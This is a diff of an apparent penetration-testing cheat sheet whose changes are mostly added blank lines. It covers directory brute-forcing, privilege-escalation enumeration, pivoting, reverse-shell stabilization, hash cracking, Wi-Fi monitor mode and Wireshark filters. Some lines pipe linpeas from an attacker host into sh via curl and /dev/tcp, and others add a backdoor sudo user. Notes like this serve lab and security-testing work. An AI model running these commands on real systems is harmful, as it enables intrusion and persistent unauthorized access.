@@ -17,9 +17,11 @@
 
 1.dirsearch -u http://url.com/ -e*
 2.gobuster dir -u http://url.com/ -w wordlist -t 10
+
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Host file direct entry:
 1.locate *.nse | grep <servicename> 
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation common Commands:
@@ -35,6 +37,7 @@ find / -perm -u=s -type f 2>/dev/null
 netstat -tuln
 getcap -r / 2>/dev/null
 filecap
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Linepeas Installation on Target with and without internet
 # From github:
@@ -50,10 +53,12 @@ python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.co
 # Local network
 sudo python3 -m http.server 80 #Host
 curl 10.10.10.10/linpeas.sh | sh #Victim
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Without curl
 sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
 cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # ligolo-ng port forwarding tool commands:
     sudo ip tuntap add user root mode tun ligolo
@@ -64,6 +69,7 @@ sudo ip link set ligolo up
 session (choose session or simply press senter)
 start (use this command in ligolo)
 sudo ip route add 240.0.0.1/32 dev ligolo (to route the local running services to our machine magic ip)
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Port Forwarding using SSH
     ssh -L 8888:localhost:8080 rajesh@34.44.2.255 (with password)
@@ -77,6 +83,7 @@ sudo adduser cyber
 sudo usermod -aG sudo cyber
 nano /etc/sudoers    #(adding user to sudoers file to get su permission)
 usrname  ALL=(ALL:ALL) ALL
+
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Stabilizing the reverse shell:
   script /dev/null -c /bin/bash
@@ -84,42 +91,51 @@ CTRL + Z
 stty raw -echo; fg
 Then press Enter twice, and then enter:
 export TERM=xterm
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
  # Converting ova to vmdk and other extensions:
 
    zip archive.zip file1 file2 directory1
 unzip archive.zip (to extract .zip)
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
 #  tar compression
  tar -cvf archive.tar file1 file2 directory1
 tar -cvzf archive.tar.gz file1 file2 directory1
 tar -cvjf archive.tar.bz2 file1 file2 directory1
 tar -cvJf archive.tar.xz file1 file2 directory1
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # tar -xvf archive.tar
 tar -xzvf archive.tar.gz
 tar -xjvf archive.tar.bz2
 tar -xJvf archive.tar.xz
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  # gzip
 gzip file.txt
 gunzip file.txt.gz (to extract .gz)
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # bzip2
 bzip2 file.txt
 bunzip2 file.txt.bz2 (to extract .bz2)
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # xz file.txt
 xz file.txt
 unxz file.txt.xz (to extract .xz)
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # 7z
 7z a archive.7z file1 file2 directory1
 7za x archive.7z (to extract .7z)
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # rar
 rar a archive.rar file1 file2 directory1
 unrar x archive.rar  (to extract .rar)
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Grep filtering commands
 grep -oP '(?<=^| )([0-9]{1,3}\.){3}[0-9]{1,3}(?= |$)'| sort | uniq  (filter ipaddress)
@@ -134,18 +150,21 @@ john --format=raw-md5 --wordlist=<wordlist> <hash_file>
 john --format=bcrypt --wordlist=<wordlist> <hash_file>
 john --format=raw-sha1 --wordlist=<wordlist> <hash_file>
 john --format=raw-sha256 --wordlist=<wordlist> <hash_file>
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  # hashcat (basic format)
 hashcat -m 0 -a 0 <hash_file> <wordlist>  (md5 hashes)
 hashcat -m 3200 -a 0 <hash_file> <wordlist> (bcrypt hashes)
 hashcat -m 100 -a 0 <hash_file> <wordlist> (sha1 hashes)
 hashcat -m 1400 -a 0 <hash_file> <wordlist> (sha 256 hashes)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------------------------------------------------------------
 # FTP server:
 apt install vsftpd
 systemctl start vsftpd
 systemctl enable vsftpd
 systemctl status vsftpd
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # wireless hacking
 sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
@@ -184,12 +203,14 @@ smtp: Filters SMTP traffic.
 ftp: Filters FTP traffic.
 ssl: Filters SSL/TLS traffic.
 ssh: Filters SSH traffic.
+
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Address Filters:
 ip.addr == x.x.x.x: Filters traffic for a specific IP address.
 ip.src == x.x.x.x: Filters traffic with a specific source IP address.
 ip.dst == x.x.x.x: Filters traffic with a specific destination IP address.
 eth.addr == xx:xx:xx:xx:xx:xx: Filters traffic based on MAC address.
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
   
